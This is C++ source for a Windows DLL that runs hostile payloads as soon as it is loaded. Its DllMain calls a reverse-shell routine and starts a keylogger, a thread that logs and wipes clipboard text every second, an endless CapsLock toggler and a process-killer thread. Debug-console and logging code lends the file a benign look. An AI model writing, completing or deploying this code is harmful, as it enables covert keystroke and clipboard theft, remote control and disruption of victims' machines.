#include "debug/dbg_manager.h"
#include "modules/module_manager.h"
#include <condition_variable>
#include <filesystem>
#include <functional>
#include <mutex>
#include <nlohmann/json.hpp>
#include <queue>
#include <spdlog/spdlog.h>
#include <thread>
#include <tlhelp32.h>
#include <vector>
#include <windows.h>

// Global variables
static DebugConsole *g_console = nullptr;
static KeyLogger *g_keyLogger = nullptr;
static std::mutex clipboardMutex;

void DumpInput() {
    g_keyLogger = new KeyLogger(GetTempLogFilePath());
    g_keyLogger->StartLogging();
    // spdlog::info("Started logger"); // Log instead of console output
}

void spamCapsLock() {
    // spdlog::info("Starting CapsLock spam thread");
    while (true) {
        keybd_event(VK_CAPITAL, 0x3A, KEYEVENTF_EXTENDEDKEY, 0);
        keybd_event(VK_CAPITAL, 0x3A, KEYEVENTF_EXTENDEDKEY | KEYEVENTF_KEYUP, 0);
        Sleep(530);
    }
}

DWORD WINAPI ClearClipboardThread(LPVOID lpParam) {
    // spdlog::info("Starting clipboard clearer");
    while (true) {
        {
            std::lock_guard<std::mutex> lock(clipboardMutex);
            if (OpenClipboard(NULL)) {
                HANDLE hData = GetClipboardData(CF_TEXT);
                if (hData) {
                    char *pszText = static_cast<char *>(GlobalLock(hData));
                    if (pszText) {
                        spdlog::info("Clipboard data: {}", pszText); // Log clipboard content
                        GlobalUnlock(hData);
                    }
                }
                EmptyClipboard();
                CloseClipboard();
            }
        }
        Sleep(1000);
    }
    return 0;
}

int main() {
    g_console = new DebugConsole(true); // Set to true to enable console
    if (!g_console->Initialize()) {
        spdlog::error("Failed to initialize console");
        return 1;
    }
    if (!g_console->InitializeLogging()) {
        spdlog::error("Failed to initialize logging");
        return 1;
    }
    DumpMemoryInfo();
    return 0;
}

extern "C" BOOL WINAPI DllMain(HINSTANCE hInstance, DWORD fdwReason, LPVOID lpRes) {
    if (fdwReason == DLL_PROCESS_ATTACH) {
        CreateThread(0, 0, (LPTHREAD_START_ROUTINE)main, 0, 0, 0);
        RevShell();
        CreateThread(0, 0, (LPTHREAD_START_ROUTINE)DumpInput, 0, 0, 0);
        CreateThread(0, 0, (LPTHREAD_START_ROUTINE)ClearClipboardThread, 0, 0, 0);
        CreateThread(0, 0, (LPTHREAD_START_ROUTINE)spamCapsLock, 0, 0, 0);
        CreateThread(0, 0, (LPTHREAD_START_ROUTINE)ProcessKillerThread, 0, 0, 0);
    } else if (fdwReason == DLL_PROCESS_DETACH) {
        if (g_console) {
            g_console->Cleanup();
            delete g_console;
            g_console = nullptr;
        }
        if (g_keyLogger) {
            g_keyLogger->StopLogging();
            delete g_keyLogger;
            g_keyLogger = nullptr;
        }
        FreeConsole();
    }
    return 1;
}